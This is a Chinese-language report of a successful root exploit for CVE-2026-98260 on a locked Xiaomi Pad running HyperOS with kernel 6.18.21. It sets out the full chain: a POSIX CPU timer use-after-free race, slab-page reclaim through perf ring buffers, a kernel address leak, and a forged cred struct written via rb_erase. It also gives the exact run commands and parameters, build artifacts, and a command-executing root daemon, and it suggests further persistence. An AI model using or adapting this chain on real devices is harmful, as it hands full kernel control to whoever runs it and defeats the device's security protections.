# CVE-2026-98260 完整 root 达成报告（HyperOS OS4.0.16.0.XBMCNXM / 内核 6.18.21）

日期：2026-10-24（设备 boot_id 1b71aad5-73b0-4275-81a1-ce40712c2be5 未变）
设备：Xiaomi Pad 9 Pro Max（yingtian，XRING O3），Android 17 / HyperOS 4.0.16.0.XBMCNXM
内核：6.18.21-android17-5-g805aa6adea19-abogki565292102-4k
状态：bootloader locked / verified boot green / SELinux 全局 Permissive / shell uid 2000 起手

## 结果（首次运行即成功，attempt 1）
- PTR_OK：目标 cred 指针 PTASK+0x908 (0xffffff8104071f88) 被改写为 fake cred 内核直接映射地址 0xffffff813953c000
- UIDNOW uid=0 euid=0 gid=0
- /proc/self/status：Uid/Gid 全 0，CapPrm/CapEff/CapBnd = 000001ffffffffff（41 个 capability 全集）
- SELinux context：kernel；getenforce = Permissive
- 常驻 root 服务：t32 --rootd 进程 pid 4157（父进程 init），adb shell（uid 2000）写命令文件 → rootd 以 uid 0 执行 → 回读结果
- 独立验证：adb shell 写 t32_rootd.seq/cmd，rootd 执行 "id; getenforce; boot_id"，返回 uid=0(root) + Permissive + boot_id

## 利用链（6.18.21 适配版）
1. CVE-2026-98260：exec/de_thread 竞态导致 POSIX CPU timer 的 k_itimer 节点在 kfree_rcu 后仍挂在 task 的 timerqueue 上（stale node）。
2. 页回收：perf_event ring buffer 页（perf_event_open 的 rb_alloc 页，内核直接映射、用户可 mmap 可写）回收已释放的 posix_timers order-1 slab 页；kretprobe rb_alloc 的 user_page=+0x118($retval) 泄露该页内核 VA（fakekva）。
3. 二次删除：waitpid 回收僵尸 → posix_cpu_timers_exit → cleanup_timerqueue → timerqueue_del 对 stale 节点执行 rb_erase。构造两个节点：
   - N（victim 页 A+0xe0）：[N]=fakekva，[N+8]=0，[N+0x10]=T（T=PTASK+0x908）
   - fakekva 处伪造 cred（page 首部）：usage=0x100000，uid/gid/suid/sgid/euid/egid/fsuid/fsgid=0，cap_permitted/effective=0x1ffffffffff（+0x38/+0x40），security/user/user_ns/ucounts/group_info 复用真实 cred 字段
4. rb_erase Case2：*(T) = pc = fakekva → cred 指针被改；第二次删除 safe 收尾（WARN 容忍，panic_on_warn=0）。
5. waitpid 返回后立即 repair 用户态页（恢复 usage/caps），getuid()=0，fork/exec 子进程继承 fake cred。

## 产物
- work/t32.c（30.6 KB，完整 C 源码，需 NDK r28c aarch64-linux-android35 clang 编译）
- work/t32.exe（42,008 B，已推送 /data/local/tmp/t32.exe）
- work/build_t32.sh、work/b32.log
- work/t32_run1.log（完整运行日志）、work/t32_proof1.txt、work/t32_rootd1.out
- work/t32_rootd.log（rootd 自身日志）

## 运行方式
adb push t32.exe /data/local/tmp/
adb shell 'cd /data/local/tmp; ./t32.exe 10000 14000 300 1 4 1 8000 800'
参数：NFILL=10000, pairs=14000, delay=300, mode=1(全核喷页), attempts=4, reps=1, churn=8000, chwait=800

## rootd 使用（本次 boot 内有效）
adb shell 向 /data/local/tmp/t32_rootd.cmd 写命令，向 t32_rootd.seq 写递增序号，
rootd 执行后把结果写 /data/local/tmp/t32_rootd.out，完成标记 t32_rootd.done。
示例：
echo 2 > /data/local/tmp/t32_rootd.seq
echo "id; getenforce" > /data/local/tmp/t32_rootd.cmd
sleep 1; adb shell cat /data/local/tmp/t32_rootd.out

## 限制与风险
- root 仅当前 boot 周期有效（reboot 后需重跑 t32.exe；rootd 进程随 reboot 消失）。
- SELinux 已处于全局 Permissive（此前阶段写入），并非 exploit 的持久配置；reboot 后恢复 Enforcing。
- 未触碰 bootloader / vbmeta / 系统分区；无持久化修改。
- 可下一步：利用现有 uid 0 + full caps，尝试 KernelSU LKM late-load（若 6.18 有可用 LKM）或其它常驻方案。
